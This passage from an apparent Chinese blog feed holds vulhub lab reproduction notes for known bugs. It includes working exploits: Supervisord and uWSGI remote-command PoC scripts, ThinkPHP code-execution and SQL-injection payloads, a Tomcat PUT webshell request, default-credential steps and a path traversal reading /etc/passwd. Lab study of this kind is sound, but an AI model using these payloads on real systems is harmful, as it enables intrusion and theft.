POC</h2><p>将命令执行的结果写入 log 文件中，再调用 Supervisord 自带的 readLog 方法读取 log 文件，将结果读出来。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> xmlrpc<span class="token punctuation">.</span>client<span class="token keyword">import</span> systarget <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">with</span> xmlrpc<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ServerProxy<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy<span class="token punctuation">:</span>    old <span class="token operator">=</span> getattr<span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">'supervisor.readLog'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    logfile <span class="token operator">=</span> getattr<span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">'supervisor.supervisord.options.logfile.strip'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    getattr<span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">'supervisor.supervisord.options.warnings.linecache.os.system'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'{} | tee -a {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>command<span class="token punctuation">,</span> logfile<span class="token punctuation">)</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> getattr<span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">'supervisor.readLog'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>len<span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>使用 Python3 执行并获取结果：<code>./poc.py "http://your-ip:9001/RPC2" "command"</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Supervisord </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 2.x 任意代码执行漏洞</title>
      <link href="/2019/03/02/thinkphp-2.x-ren-yi-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/02/thinkphp-2.x-ren-yi-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x-任意代码执行漏洞"><a href="#ThinkPHP-2-x-任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x 任意代码执行漏洞"></a>ThinkPHP 2.x 任意代码执行漏洞</h1><p>ThinkPHP 2.x 版本中，使用 <code>preg_replace的/e</code> 模式匹配路由：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'@(\w+)'</span><span class="token punctuation">.</span><span class="token variable">$depr</span><span class="token punctuation">.</span><span class="token string">'([^'</span><span class="token punctuation">.</span><span class="token variable">$depr</span><span class="token punctuation">.</span><span class="token string">'\/]+)@e'</span><span class="token punctuation">,</span> <span class="token string">'$var[\'\\1\']="\\2";'</span><span class="token punctuation">,</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token variable">$depr</span><span class="token punctuation">,</span><span class="token variable">$paths</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>直接访问 <code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo()</code>：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321110401.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ThinkPHP5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</title>
      <link href="/2019/03/02/thinkphp5-5.0.22-5.1.29-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/02/thinkphp5-5.0.22-5.1.29-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#ThinkPHP5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞"></a>ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞</h1><p>ThinkPHP是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="http://www.thinkphp.cn/topic/60400.html" target="_blank" rel="noopener">http://www.thinkphp.cn/topic/60400.html</a></li><li><a href="http://www.thinkphp.cn/topic/60390.html" target="_blank" rel="noopener">http://www.thinkphp.cn/topic/60390.html</a></li><li><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问 <a href="http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1" target="_blank" rel="noopener">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</a>，即可执行 phpinfo：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321103654.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ThinkPHP5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5 5.0.23 远程代码执行漏洞</title>
      <link href="/2019/03/02/thinkphp5-5.0.23-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2019/03/02/thinkphp5-5.0.23-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP5-5-0-23-远程代码执行漏洞"><a href="#ThinkPHP5-5-0-23-远程代码执行漏洞" class="headerlink" title="ThinkPHP5 5.0.23 远程代码执行漏洞"></a>ThinkPHP5 5.0.23 远程代码执行漏洞</h1><p>ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>发送数据包：</p><pre class=" language-http"><code class="language-http">POST /index.php?s=captcha HTTP/1.1<span class="token header-name keyword">Host:</span> localhost<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></pre><p>成功执行 <code>id</code> 命令：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321104834.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ThinkPHP5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</title>
      <link href="/2019/03/02/thinkphp5-sql-zhu-ru-lou-dong-min-gan-xin-xi-xie-lu/"/>
      <url>/2019/03/02/thinkphp5-sql-zhu-ru-lou-dong-min-gan-xin-xi-xie-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露"><a href="#ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露" class="headerlink" title="ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞原理说明：</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></li><li><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问 <a href="http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1" target="_blank" rel="noopener">http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</a>，信息成功被爆出：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321102323.png-water_print" alt=""></p><p>当然，这是一个比较鸡肋的SQL注入漏洞。但通过DEBUG页面，我们找到了数据库的账号、密码：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321102458.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ThinkPHP5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）</title>
      <link href="/2019/03/02/tomcat-put-fang-fa-ren-yi-xie-wen-jian-lou-dong/"/>
      <url>/2019/03/02/tomcat-put-fang-fa-ren-yi-xie-wen-jian-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-PUT-方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT-方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞本质 Tomcat 配置了可写（readonly=false），导致我们可以往服务器写文件：</p><pre><code>&lt;servlet&gt;    &lt;servlet-name&gt;default&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;debug&lt;/param-name&gt;        &lt;param-value&gt;0&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;        &lt;param-name&gt;listings&lt;/param-name&gt;        &lt;param-value&gt;false&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;        &lt;param-name&gt;readonly&lt;/param-name&gt;        &lt;param-value&gt;false&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;</code></pre><p>虽然 Tomcat 对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过了限制。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接发送以下数据包即可在 Web 根目录写入 shell：</p><pre class=" language-http"><code class="language-http">PUT /1.jsp/ HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:8080<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 5shell</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat 弱口令导致后台 getshell</title>
      <link href="/2019/03/02/tomcat-ruo-kou-ling-dao-zhi-hou-tai-getshell/"/>
      <url>/2019/03/02/tomcat-ruo-kou-ling-dao-zhi-hou-tai-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-弱口令导致后台-getshell"><a href="#Tomcat-弱口令导致后台-getshell" class="headerlink" title="Tomcat 弱口令导致后台 getshell"></a>Tomcat 弱口令导致后台 getshell</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Tomcat版本：8.0</p><p>Tomcat支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+ 权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有 html 页面权限</li><li>manager-status 拥有查看 status 的权限</li><li>manager-script 拥有 text 接口的权限，和 status 权限</li><li>manager-jmx 拥有 jmx 权限，和 status 权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有 html 页面权限</li><li>admin-script 拥有 text 接口权限</li></ul></li></ul><p>在 <code>conf/tomcat-users.xml</code> 文件中配置用户的权限：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tomcat-users</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://tomcat.apache.org/xml<span class="token punctuation">"</span></span>              <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>              <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://tomcat.apache.org/xml tomcat-users.xsd<span class="token punctuation">"</span></span>              <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manager-gui<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manager-script<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manager-jmx<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manager-status<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>admin-gui<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>role</span> <span class="token attr-name">rolename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>admin-script<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">username</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span> <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tomcat<span class="token punctuation">"</span></span> <span class="token attr-name">roles</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tomcat-users</span><span class="token punctuation">></span></span></code></pre><p>可见，用户 tomcat 拥有上述所有权限，密码是 tomcat。</p><p>正常安装的情况下，tomcat8 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开tomcat管理页面 <a href="http://your-ip:8080/manager/html" target="_blank" rel="noopener">http://your-ip:8080/manager/html</a>，输入弱密码 <code>tomcat:tomcat</code>，即可访问后台：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200321100456.png-water_print" alt=""></p><p>上传 war 包即可直接 getshell。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uWSGI PHP目录穿越漏洞（CVE-2018-7490）</title>
      <link href="/2019/03/02/uwsgi-php-mu-lu-chuan-yue-lou-dong/"/>
      <url>/2019/03/02/uwsgi-php-mu-lu-chuan-yue-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="uWSGI-PHP目录穿越漏洞（CVE-2018-7490）"><a href="#uWSGI-PHP目录穿越漏洞（CVE-2018-7490）" class="headerlink" title="uWSGI PHP目录穿越漏洞（CVE-2018-7490）"></a>uWSGI PHP目录穿越漏洞（CVE-2018-7490）</h1><p>uWSGI 是一款 Web 应用程序服务器，它实现了 WSGI、uwsgi 和 http 等协议，并支持通过插件来运行各种语言。</p><p>uWSGI 2.0.17 之前的 PHP 插件，没有正确的处理 DOCUMENT_ROOT 检测，导致用户可以通过..%2f来跨越目录，读取或运行 DOCUMENT_ROOT 目录以外的文件。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行完成后，访问 [<a href="http://your-ip:8080/http://your-ip:8080/" target="_blank" rel="noopener">http://your-ip:8080/http://your-ip:8080/</a>) 即可看到 phpinfo 信息，说明 uwsgi-php 服务器已成功运行。</p><p>访问<a href="http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd" target="_blank" rel="noopener">http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd</a>，成功读取文件：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200319113322.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> uWSGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uWSGI 未授权访问漏洞</title>
      <link href="/2019/03/02/uwsgi-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2019/03/02/uwsgi-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="uWSGI-未授权访问漏洞"><a href="#uWSGI-未授权访问漏洞" class="headerlink" title="uWSGI 未授权访问漏洞"></a>uWSGI 未授权访问漏洞</h1><p>uWSGI 是一款 Web 应用程序服务器，它实现了 WSGI、uwsgi 和 http 等协议，并支持通过插件来运行各种语言，通常被用于运行 Python WEB 应用。uwsgi 除了是应用容器的名称之外，它和 Fastcgi 之类的一样，也是前端 server 与后端应用容器之间的一个交流标准。目前 nginx，apache 也支持 uwsgi 协议进行代理转发请求。</p><p>uWSGI 支持通过魔术变量（Magic Variables）的方式动态配置后端 Web 应用。如果其端口暴露在外，攻击者可以构造 uwsgi 数据包，并指定魔术变量 UWSGI_FILE，运用 <code>exec://</code> 协议执行任意命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用 <code>poc.py</code>，执行命令 <code>python poc.py -u your-ip:8000 -c "touch /tmp/success"</code> ：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># coding: utf-8</span><span class="token comment" spellcheck="true">######################</span><span class="token comment" spellcheck="true"># Uwsgi RCE Exploit</span><span class="token comment" spellcheck="true">######################</span><span class="token comment" spellcheck="true"># Author: wofeiwo@80sec.com</span><span class="token comment" spellcheck="true"># Created: 2017-7-18</span><span class="token comment" spellcheck="true"># Last modified: 2018-1-30</span><span class="token comment" spellcheck="true"># Note: Just for research purpose</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> socket<span class="token keyword">import</span> argparse<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">sz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> hex<span class="token punctuation">(</span>x <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>x<span class="token punctuation">,</span> int<span class="token punctuation">)</span> <span class="token keyword">else</span> len<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">else</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">pack_uwsgi_vars</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">:</span>    pk <span class="token operator">=</span> b<span class="token string">''</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> var<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>var<span class="token punctuation">,</span> <span class="token string">'items'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> var<span class="token punctuation">:</span>        pk <span class="token operator">+=</span> sz<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">+</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> b<span class="token string">'\x00'</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>pk<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\x00'</span> <span class="token operator">+</span> pk    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">parse_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> default_port<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    port <span class="token operator">=</span> default_port    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> addr<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            addr<span class="token punctuation">,</span> port <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> addr        <span class="token keyword">elif</span> <span class="token string">':'</span> <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            addr<span class="token punctuation">,</span> _<span class="token punctuation">,</span> port <span class="token operator">=</span> addr<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> isinstance<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token punctuation">(</span>list<span class="token punctuation">,</span> tuple<span class="token punctuation">,</span> set<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        addr<span class="token punctuation">,</span> port <span class="token operator">=</span> addr    port <span class="token operator">=</span> int<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token keyword">if</span> port <span class="token keyword">else</span> port    <span class="token keyword">return</span> <span class="token punctuation">(</span>addr <span class="token operator">or</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_host_from_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'//'</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span>        url <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span 